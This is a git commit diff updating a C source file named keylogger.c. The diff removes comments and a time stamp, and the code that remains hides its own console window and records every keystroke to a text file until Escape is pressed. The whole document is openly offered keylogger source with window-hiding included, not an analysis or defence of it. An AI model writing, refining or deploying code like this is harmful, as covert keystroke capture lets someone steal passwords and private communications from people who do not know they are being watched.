d6699a01e1219e12088a265312e80785ed241977
AdityaInfinite <60790773+AdityaInfinite@users.noreply.github.com>
2020-10-04 18:12:40 +0530

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -7,49 +7,40 @@ int main()
 {
     char capture;
     FILE *file;
-
-    // Time stuff.
-    time_t t;
-    t = time(NULL);
-    // Hide the window
     HWND window;
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
     
     file = fopen("keylogger.txt", "w");
-    fprintf(file, "\n#$Logger: Written by jkrix. Started logging @ " /*ctime(&time)*/);
+    fprintf(file, "Started logging");
     printf("started logging %u",file);
     
 
     while (1)
     {
-        //Sleep(20); // To make sure this program doesn't steal all resources.
         if (kbhit())
         {
             capture = getch();
-            // Just add in some helper strings here to the file, feel free to modify these to your needs.
             switch ((int)capture)
             {
-            case ' ': // Space key...obviously.
+            case ' ': 
                 fprintf(file, " ");
                 break;
-            case 0x09: // Tab key.
+            case 0x09:
                 fprintf(file, "[TAB]");
                 break;
-            case 0x0D: // Enter key.
+            case 0x0D:
                 fprintf(file, "[ENTER]");
                 break;
-            case 0x1B: // Escape key.
+            case 0x1B: 
                 fprintf(file, "[ESC]");
                 break;
-            case 0x08: // Backspace key.
+            case 0x08:
                 fprintf(file, "[BACKSPACE]");
-                //fputs("baksp",file);
                 break;
             default:
-                fputc(capture, file); // Put any other inputted key into the file.
-                //fputs((char)capture, file);
+                fputc(capture, file);
             }
             if((int)capture == 0x08)
             {
@@ -57,10 +48,10 @@ int main()
             }
 
             if ((int)capture == 27)
-            { // The escape key. You can change this to anything you want.
+            {
                 fputs("\nstopped",file);
                 fclose(file);
-                printf("stopped loging");
+                printf("\nstopped loging");
                 return 0;
             }
         }
